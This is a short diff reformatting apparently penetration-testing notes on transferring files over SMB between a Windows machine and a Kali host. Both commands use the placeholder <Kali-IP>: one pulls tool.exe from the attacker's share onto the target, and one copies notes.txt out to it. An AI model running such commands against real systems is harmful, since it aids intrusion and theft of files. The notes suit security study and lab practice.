@@ -6,6 +6,10 @@
 
 ### 2) Transfer files using the copy command on Windows machine
 
-    Download: copy \\<Kali-IP>\<share_name>\tool.exe
+Download: 
+    
+    copy \\<Kali-IP>\<share_name>\tool.exe
 
-    Upload: copy notes.txt \\<Kali-IP>\<share_name>\
+Upload: 
+    
+    copy notes.txt \\<Kali-IP>\<share_name>\
